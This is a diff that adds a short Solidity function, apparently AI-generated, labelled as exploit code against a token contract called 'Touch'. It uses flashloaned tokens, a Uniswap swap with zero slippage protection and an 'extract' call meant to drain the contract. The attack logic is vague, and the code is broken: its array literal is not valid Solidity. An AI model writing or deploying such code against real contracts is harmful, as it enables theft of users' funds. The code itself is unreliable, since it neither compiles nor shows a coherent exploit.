@@ -1,0 +1,30 @@
+```solidity
+<executeExploitCode>
+function executeExploit(uint256 amount) internal {
+    // Start by interacting with the Touch contract to exploit it.
+    ITouch touch = ITouch(target);
+
+    // First we will take all the valuable tokens from the flashloan.
+    uint256 valuableTokenAmount = valuableToken.balanceOf(address(this));
+    touch.transfer(address(this), 0); // Attempt a trivial transaction to utilize the Touch contract's internal logic.
+    
+    // Now we will swap some valuable tokens on Uniswap for a new token.
+    // We will use the valuable tokens obtained from the flashloan.
+    uniswapRouter.swapExactTokensForTokensSupportingFeeOnTransferTokens(
+        amount,
+        0, // Setting minimum amount to receive as 0 for simplicity
+        new address[](2) { address(valuableToken), address(touch) }, // token paths
+        address(this),
+        block.timestamp + 1
+    );
+
+    // Check the balances again and try to extract more tokens from the Touch contract.
+    uint256 newTokens = touch.balanceOf(address(this));
+
+    // If we still have tokens at this point, we will extract all of them as a final step.
+    if (newTokens > 0) {
+        touch.extract(address(touch)); // Extract tokens or any extra WETH we have left somehow.
+    }
+}
+</executeExploitCode>
+```
